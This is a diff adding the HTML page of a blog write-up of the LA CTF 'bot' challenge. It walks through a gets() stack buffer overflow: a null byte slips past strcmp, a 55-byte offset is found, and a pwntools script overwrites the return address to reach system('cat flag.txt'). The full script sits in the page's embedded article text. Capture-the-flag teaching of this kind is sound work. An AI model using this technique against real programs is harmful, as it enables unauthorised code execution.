@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>LA CTF - pwn: bot | All Things Cyber – joonkim0625</title>
+<meta name="keywords" content="ctf, la ctf, cybersecurity, buffer overflow, python, strcmp, flow control">
+<meta name="description" content="Description
+I made a bot to automatically answer all of your questions.
+nc lac.tf 31180
+My approach
+Again, the source code, its binary, and the Dockerfile were given. Looking at the
+sour code code:
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(void) {
+  setbuf(stdout, NULL);
+  char input[64];
+  volatile int give_flag = 0;
+  puts(&#34;hi, how can i help?&#34;);
+  gets(input);
+  if (strcmp(input, &#34;give me the flag&#34;) == 0) {
+    puts(&#34;lol no&#34;);
+  } else if (strcmp(input, &#34;please give me the flag&#34;) == 0) {
+    puts(&#34;no&#34;);
+  } else if (strcmp(input, &#34;help, i have no idea how to solve this&#34;) == 0) {
+    puts(&#34;L&#34;);
+  } else if (strcmp(input, &#34;may i have the flag?&#34;) == 0) {
+    puts(&#34;not with that attitude&#34;);
+  } else if (strcmp(input, &#34;please please please give me the flag&#34;) == 0) {
+    puts(&#34;i&#39;ll consider it&#34;);
+    sleep(15);
+    if (give_flag) {
+      puts(&#34;ok here&#39;s your flag&#34;);
+      system(&#34;cat flag.txt&#34;);
+    } else {
+      puts(&#34;no&#34;);
+    }
+  } else {
+    puts(&#34;sorry, i didn&#39;t understand your question&#34;);
+    exit(1);
+  }
+}
+After looking at the source code, I noticed that there is a give_flag variable
+and a buffer that we can overflow since the user input is received with
+gets(). Unlike the previous challenge I worked on, give_flag variable would
+always be located after the buffer input so we won&rsquo;t be able to modify the
+value of give_flag this time.">
+<meta name="author" content="Joon Kim">
+<link rel="canonical" href="https://joonkim0625.github.io/posts/2023-2-14-la-ctf-pwn-bot/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2023-2-14-la-ctf-pwn-bot/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2023-2-14-la-ctf-pwn-bot/">
+  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
+  <meta property="og:title" content="LA CTF - pwn: bot">
+  <meta property="og:description" content="Description I made a bot to automatically answer all of your questions.
+nc lac.tf 31180
+My approach Again, the source code, its binary, and the Dockerfile were given. Looking at the sour code code:
+#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; int main(void) { setbuf(stdout, NULL); char input[64]; volatile int give_flag = 0; puts(&#34;hi, how can i help?&#34;); gets(input); if (strcmp(input, &#34;give me the flag&#34;) == 0) { puts(&#34;lol no&#34;); } else if (strcmp(input, &#34;please give me the flag&#34;) == 0) { puts(&#34;no&#34;); } else if (strcmp(input, &#34;help, i have no idea how to solve this&#34;) == 0) { puts(&#34;L&#34;); } else if (strcmp(input, &#34;may i have the flag?&#34;) == 0) { puts(&#34;not with that attitude&#34;); } else if (strcmp(input, &#34;please please please give me the flag&#34;) == 0) { puts(&#34;i&#39;ll consider it&#34;); sleep(15); if (give_flag) { puts(&#34;ok here&#39;s your flag&#34;); system(&#34;cat flag.txt&#34;); } else { puts(&#34;no&#34;); } } else { puts(&#34;sorry, i didn&#39;t understand your question&#34;); exit(1); } } After looking at the source code, I noticed that there is a give_flag variable and a buffer that we can overflow since the user input is received with gets(). Unlike the previous challenge I worked on, give_flag variable would always be located after the buffer input so we won’t be able to modify the value of give_flag this time.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-02-14T10:00:00+00:00">
+    <meta property="article:modified_time" content="2023-02-14T10:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="La Ctf">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Buffer Overflow">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Strcmp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="LA CTF - pwn: bot">
+<meta name="twitter:description" content="Description
+I made a bot to automatically answer all of your questions.
+nc lac.tf 31180
+My approach
+Again, the source code, its binary, and the Dockerfile were given. Looking at the
+sour code code:
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(void) {
+  setbuf(stdout, NULL);
+  char input[64];
+  volatile int give_flag = 0;
+  puts(&#34;hi, how can i help?&#34;);
+  gets(input);
+  if (strcmp(input, &#34;give me the flag&#34;) == 0) {
+    puts(&#34;lol no&#34;);
+  } else if (strcmp(input, &#34;please give me the flag&#34;) == 0) {
+    puts(&#34;no&#34;);
+  } else if (strcmp(input, &#34;help, i have no idea how to solve this&#34;) == 0) {
+    puts(&#34;L&#34;);
+  } else if (strcmp(input, &#34;may i have the flag?&#34;) == 0) {
+    puts(&#34;not with that attitude&#34;);
+  } else if (strcmp(input, &#34;please please please give me the flag&#34;) == 0) {
+    puts(&#34;i&#39;ll consider it&#34;);
+    sleep(15);
+    if (give_flag) {
+      puts(&#34;ok here&#39;s your flag&#34;);
+      system(&#34;cat flag.txt&#34;);
+    } else {
+      puts(&#34;no&#34;);
+    }
+  } else {
+    puts(&#34;sorry, i didn&#39;t understand your question&#34;);
+    exit(1);
+  }
+}
+After looking at the source code, I noticed that there is a give_flag variable
+and a buffer that we can overflow since the user input is received with
+gets(). Unlike the previous challenge I worked on, give_flag variable would
+always be located after the buffer input so we won&rsquo;t be able to modify the
+value of give_flag this time.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://joonkim0625.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "LA CTF - pwn: bot",
+      "item": "https://joonkim0625.github.io/posts/2023-2-14-la-ctf-pwn-bot/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "LA CTF - pwn: bot",
+  "name": "LA CTF - pwn: bot",
+  "description": "Description I made a bot to automatically answer all of your questions.\nnc lac.tf 31180\nMy approach Again, the source code, its binary, and the Dockerfile were given. Looking at the sour code code:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main(void) { setbuf(stdout, NULL); char input[64]; volatile int give_flag = 0; puts(\u0026#34;hi, how can i help?\u0026#34;); gets(input); if (strcmp(input, \u0026#34;give me the flag\u0026#34;) == 0) { puts(\u0026#34;lol no\u0026#34;); } else if (strcmp(input, \u0026#34;please give me the flag\u0026#34;) == 0) { puts(\u0026#34;no\u0026#34;); } else if (strcmp(input, \u0026#34;help, i have no idea how to solve this\u0026#34;) == 0) { puts(\u0026#34;L\u0026#34;); } else if (strcmp(input, \u0026#34;may i have the flag?\u0026#34;) == 0) { puts(\u0026#34;not with that attitude\u0026#34;); } else if (strcmp(input, \u0026#34;please please please give me the flag\u0026#34;) == 0) { puts(\u0026#34;i\u0026#39;ll consider it\u0026#34;); sleep(15); if (give_flag) { puts(\u0026#34;ok here\u0026#39;s your flag\u0026#34;); system(\u0026#34;cat flag.txt\u0026#34;); } else { puts(\u0026#34;no\u0026#34;); } } else { puts(\u0026#34;sorry, i didn\u0026#39;t understand your question\u0026#34;); exit(1); } } After looking at the source code, I noticed that there is a give_flag variable and a buffer that we can overflow since the user input is received with gets(). Unlike the previous challenge I worked on, give_flag variable would always be located after the buffer input so we won\u0026rsquo;t be able to modify the value of give_flag this time.\n",
+  "keywords": [
+    "ctf", "la ctf", "cybersecurity", "buffer overflow", "python", "strcmp", "flow control"
+  ],
+  "articleBody": "Description I made a bot to automatically answer all of your questions.\nnc lac.tf 31180\nMy approach Again, the source code, its binary, and the Dockerfile were given. Looking at the sour code code:\n#include #include #include #include int main(void) { setbuf(stdout, NULL); char input[64]; volatile int give_flag = 0; puts(\"hi, how can i help?\"); gets(input); if (strcmp(input, \"give me the flag\") == 0) { puts(\"lol no\"); } else if (strcmp(input, \"please give me the flag\") == 0) { puts(\"no\"); } else if (strcmp(input, \"help, i have no idea how to solve this\") == 0) { puts(\"L\"); } else if (strcmp(input, \"may i have the flag?\") == 0) { puts(\"not with that attitude\"); } else if (strcmp(input, \"please please please give me the flag\") == 0) { puts(\"i'll consider it\"); sleep(15); if (give_flag) { puts(\"ok here's your flag\"); system(\"cat flag.txt\"); } else { puts(\"no\"); } } else { puts(\"sorry, i didn't understand your question\"); exit(1); } } After looking at the source code, I noticed that there is a give_flag variable and a buffer that we can overflow since the user input is received with gets(). Unlike the previous challenge I worked on, give_flag variable would always be located after the buffer input so we won’t be able to modify the value of give_flag this time.\nI ran checksec on the binary:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) The NX bit is on but PIE is disabled. The immediate thought was to control the code flow of the program by overwriting the return address. How would we do this? I think looking at the result of objdump of the binary can be very helpful.\n0000000000401182 : 401182: 55 push rbp 401183: 48 89 e5 mov rbp,rsp 401186: 48 83 ec 50 sub rsp,0x50 40118a: 48 8b 05 cf 2e 00 00 mov rax,QWORD PTR [rip+0x2ecf] # 404060 401191: be 00 00 00 00 mov esi,0x0 401196: 48 89 c7 mov rdi,rax 401199: e8 a2 fe ff ff call 401040 40119e: c7 45 bc 00 00 00 00 mov DWORD PTR [rbp-0x44],0x0 4011a5: 48 8d 3d 5c 0e 00 00 lea rdi,[rip+0xe5c] # 402008 \u003c_IO_stdin_used+0x8\u003e 4011ac: e8 7f fe ff ff call 401030 4011b1: 48 8d 45 c0 lea rax,[rbp-0x40] 4011b5: 48 89 c7 mov rdi,rax 4011b8: e8 b3 fe ff ff call 401070 4011bd: 48 8d 45 c0 lea rax,[rbp-0x40] 4011c1: 48 8d 35 54 0e 00 00 lea rsi,[rip+0xe54] # 40201c \u003c_IO_stdin_used+0x1c\u003e 4011c8: 48 89 c7 mov rdi,rax 4011cb: e8 90 fe ff ff call 401060 4011d0: 85 c0 test eax,eax 4011d2: 75 11 jne 4011e5 4011d4: 48 8d 3d 52 0e 00 00 lea rdi,[rip+0xe52] # 40202d \u003c_IO_stdin_used+0x2d\u003e 4011db: e8 50 fe ff ff call 401030 4011e0: e9 e7 00 00 00 jmp 4012cc 4011e5: 48 8d 45 c0 lea rax,[rbp-0x40] 4011e9: 48 8d 35 44 0e 00 00 lea rsi,[rip+0xe44] # 402034 \u003c_IO_stdin_used+0x34\u003e 4011f0: 48 89 c7 mov rdi,rax 4011f3: e8 68 fe ff ff call 401060 4011f8: 85 c0 test eax,eax 4011fa: 75 11 jne 40120d 4011fc: 48 8d 3d 49 0e 00 00 lea rdi,[rip+0xe49] # 40204c \u003c_IO_stdin_used+0x4c\u003e 401203: e8 28 fe ff ff call 401030 401208: e9 bf 00 00 00 jmp 4012cc 40120d: 48 8d 45 c0 lea rax,[rbp-0x40] 401211: 48 8d 35 38 0e 00 00 lea rsi,[rip+0xe38] # 402050 \u003c_IO_stdin_used+0x50\u003e 401218: 48 89 c7 mov rdi,rax 40121b: e8 40 fe ff ff call 401060 401220: 85 c0 test eax,eax 401222: 75 11 jne 401235 401224: 48 8d 3d 4c 0e 00 00 lea rdi,[rip+0xe4c] # 402077 \u003c_IO_stdin_used+0x77\u003e 40122b: e8 00 fe ff ff call 401030 401230: e9 97 00 00 00 jmp 4012cc 401235: 48 8d 45 c0 lea rax,[rbp-0x40] 401239: 48 8d 35 39 0e 00 00 lea rsi,[rip+0xe39] # 402079 \u003c_IO_stdin_used+0x79\u003e 401240: 48 89 c7 mov rdi,rax 401243: e8 18 fe ff ff call 401060 401248: 85 c0 test eax,eax 40124a: 75 0e jne 40125a 40124c: 48 8d 3d 3b 0e 00 00 lea rdi,[rip+0xe3b] # 40208e \u003c_IO_stdin_used+0x8e\u003e 401253: e8 d8 fd ff ff call 401030 401258: eb 72 jmp 4012cc 40125a: 48 8d 45 c0 lea rax,[rbp-0x40] 40125e: 48 8d 35 43 0e 00 00 lea rsi,[rip+0xe43] # 4020a8 \u003c_IO_stdin_used+0xa8\u003e 401265: 48 89 c7 mov rdi,rax 401268: e8 f3 fd ff ff call 401060 40126d: 85 c0 test eax,eax 40126f: 75 45 jne 4012b6 401271: 48 8d 3d 56 0e 00 00 lea rdi,[rip+0xe56] # 4020ce \u003c_IO_stdin_used+0xce\u003e 401278: e8 b3 fd ff ff call 401030 40127d: bf 0f 00 00 00 mov edi,0xf 401282: e8 09 fe ff ff call 401090 401287: 8b 45 bc mov eax,DWORD PTR [rbp-0x44] 40128a: 85 c0 test eax,eax 40128c: 74 1a je 4012a8 40128e: 48 8d 3d 4a 0e 00 00 lea rdi,[rip+0xe4a] # 4020df \u003c_IO_stdin_used+0xdf\u003e 401295: e8 96 fd ff ff call 401030 40129a: 48 8d 3d 52 0e 00 00 lea rdi,[rip+0xe52] # 4020f3 \u003c_IO_stdin_used+0xf3\u003e 4012a1: e8 aa fd ff ff call 401050 4012a6: eb 24 jmp 4012cc 4012a8: 48 8d 3d 9d 0d 00 00 lea rdi,[rip+0xd9d] # 40204c \u003c_IO_stdin_used+0x4c\u003e 4012af: e8 7c fd ff ff call 401030 4012b4: eb 16 jmp 4012cc 4012b6: 48 8d 3d 43 0e 00 00 lea rdi,[rip+0xe43] # 402100 \u003c_IO_stdin_used+0x100\u003e 4012bd: e8 6e fd ff ff call 401030 4012c2: bf 01 00 00 00 mov edi,0x1 4012c7: e8 b4 fd ff ff call 401080 4012cc: b8 00 00 00 00 mov eax,0x0 4012d1: c9 leave 4012d2: c3 ret 4012d3: 66 2e 0f 1f 84 00 00 cs nop WORD PTR [rax+rax*1+0x0] 4012da: 00 00 00 4012dd: 0f 1f 00 nop DWORD PTR [rax] This is objdump result of main(). If you compare this to the main function written in C, you can see that all those calls to strcmp@plt. And what we need to be aware is after puts call within the strcmp scope:\n4011cb: e8 90 fe ff ff call 401060 4011d0: 85 c0 test eax,eax 4011d2: 75 11 jne 4011e5 4011d4: 48 8d 3d 52 0e 00 00 lea rdi,[rip+0xe52] # 40202d \u003c_IO_stdin_used+0x2d\u003e 4011db: e8 50 fe ff ff call 401030 4011e0: e9 e7 00 00 00 jmp 4012cc we can see that the code flow jumps to 4012cc which is at the end of the main function. If we take a look at 4012cc:\n4012cc: b8 00 00 00 00 mov eax,0x0 4012d1: c9 leave 4012d2: c3 ret we can see that there is a ret instruction that jumps to __libc_start_call_main (so the main function also returns to somewhere!). So, if we can jump into one of the strcmp scope and overflow the buffer with the address of our control, I think we can get the flag. Since PIE is disabled meaning the program will be loaded into the exact same location every time, we can maybe able to make the control flow go to where the system(\"cat flga.txt\"); is!\nBut, the question is how are we going to overwrite the return address? Because if we pass any inputs other than those ones that are being compared to some strings, the code flow will end up hitting exit(1) and this terminates the program immediately without returning to anywhere. So we want to make sure we can jump into one of the if cases so the code flow ends up at 4012cc. If you were thinking passing a big chunk of input to the program, it will always hit the last else part that will lead us to exit(1). If we understand how strcmp works, we can easily pass the input of our choice and overwrite the buffer.\nstrcmp compares two strings that are passed to it. How it works is it will compare each character from the two strings. If it finds a match, it returns 0. If not, then it will return some other integer values based on the result of the integer comparison of the two characters. Let’s take a look at an input please please please give me the flagaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.\nIf you pass this input to the program, you will get:\n─$ python3 -c 'print(\"please please please give me the flag\" + \"a\" * 100)' | ./bot hi, how can i help? sorry, i didn't understand your question As you can see, it fell into the exit(1). The reason is the data we passed in did not separate between please please ... the flag and the as that I sent in to see if the return address gets overwritten. strcmp stops reading when it sees a NULL byte! Using this characteristic of strcmp, we can build a payload that is\n└─$ python3 -c 'print(\"please give me the flag\" + \"\\x00\" + \"a\" * 100)' please give me the flagaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa It may not be apparent from the string created but I inserted a null byte between the first chunk of string and the bunch of ‘a’s. This will allow strcmp to compare the string up to \\x00 and still the buffer will be overwritten with a bunch of ‘a’s.\nWe will create a file that contains the payload above and pass it into GDB to see if the payload overwrites the ret address. I modified the input file - replaced ‘a’s with the cyclic of 128 chars.\n// there is a null byte after 'flag' please give me the flagaaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaa So, I write the above payload to a file and feed it when running bot in GDB. The result I got when the instruction was at 0x4012d2 ret, 0x7fffffffdd88: 0x6161616161616861. If we find this pattern, we get 55 (meaning the distance from the beginning of the buffer to right before the ret address is 55 bytes).\nKnowing this, we can prepare a python script that will do the rest for us.\nfrom pwn import * p = remote(\"lac.tf\", \"31180\") payload = b\"give me the flag\" payload += b\"\\x00\" payload += b\"A\" * 55 # this is the address to an instruction right before the system call payload += p64(0x40129a) p.sendline(payload) p.interactive() As you can see, the payload starts with “give me the flag” string followed by a null byte so strcmp can actually compare the two strings. After that, I filled 55 bytes with A’s and then added the address of the instruction that I want the code flow to go to. If we run this script, we would get:\n└─$ python3 sol.py [+] Opening connection to lac.tf on port 31180: Done [*] Switching to interactive mode hi, how can i help? lol no lactf{hey_stop_bullying_my_bot_thats_not_nice} Conclusion Noticing how strcmp works and creating a payload that exploits that characteristic was important. Thanks for reading!\n",
+  "wordCount" : "1796",
+  "inLanguage": "en",
+  "datePublished": "2023-02-14T10:00:00Z",
+  "dateModified": "2023-02-14T10:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Joon Kim"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://joonkim0625.github.io/posts/2023-2-14-la-ctf-pwn-bot/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "All Things Cyber – joonkim0625",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://joonkim0625.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      LA CTF - pwn: bot
+    </h1>
+    <div class="post-meta"><span title='2023-02-14 10:00:00 +0000 UTC'>February 14, 2023</span>&nbsp;·&nbsp;Joon Kim
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h2>
+<p>I made a bot to automatically answer all of your questions.</p>
+<p>nc lac.tf 31180</p>
+<h2 id="my-approach">My approach<a hidden class="anchor" aria-hidden="true" href="#my-approach">#</a></h2>
+<p>Again, the source code, its binary, and the Dockerfile were given. Looking at the
+sour code code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdout, NULL);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">int</span> give_flag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;hi, how can i help?&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(input);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;give me the flag&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;lol no&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;please give me the flag&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;no&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;help, i have no idea how to solve this&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;L&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;may i have the flag?&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;not with that attitude&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;please please please give me the flag&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;i&#39;ll consider it&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">15</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (give_flag) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;ok here&#39;s your flag&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat flag.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;no&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;sorry, i didn&#39;t understand your question&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>After looking at the source code, I noticed that there is a <code>give_flag</code> variable
+and a buffer that we can overflow since the user input is received with
+<code>gets()</code>. Unlike the previous challenge I worked on, <code>give_flag</code> variable would
+always be located after the buffer <code>input</code> so we won&rsquo;t be able to modify the
+value of <code>give_flag</code> this time.</p>
+<p>I ran checksec on the binary:</p>
+<pre tabindex="0"><code>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</code></pre><p>The NX bit is on but PIE is disabled. The immediate thought was to control the
+code flow of the program by overwriting the return address. How would we do
+this? I think looking at the result of <code>objdump</code> of the binary can be very
+helpful.</p>
+<pre tabindex="0"><code>0000000000401182 &lt;main&gt;:
+  401182:       55                      push   rbp
+  401183:       48 89 e5                mov    rbp,rsp
+  401186:       48 83 ec 50             sub    rsp,0x50
+  40118a:       48 8b 05 cf 2e 00 00    mov    rax,QWORD PTR [rip+0x2ecf]        # 404060 &lt;stdout@GLIBC_2.2.5&gt;
+  401191:       be 00 00 00 00          mov    esi,0x0
+  401196:       48 89 c7                mov    rdi,rax
+  401199:       e8 a2 fe ff ff          call   401040 &lt;setbuf@plt&gt;
+  40119e:       c7 45 bc 00 00 00 00    mov    DWORD PTR [rbp-0x44],0x0
+  4011a5:       48 8d 3d 5c 0e 00 00    lea    rdi,[rip+0xe5c]        # 402008 &lt;_IO_stdin_used+0x8&gt;
+  4011ac:       e8 7f fe ff ff          call   401030 &lt;puts@plt&gt;
+  4011b1:       48 8d 45 c0             lea    rax,[rbp-0x40]
+  4011b5:       48 89 c7                mov    rdi,rax
+  4011b8:       e8 b3 fe ff ff          call   401070 &lt;gets@plt&gt;
+  4011bd:       48 8d 45 c0             lea    rax,[rbp-0x40]
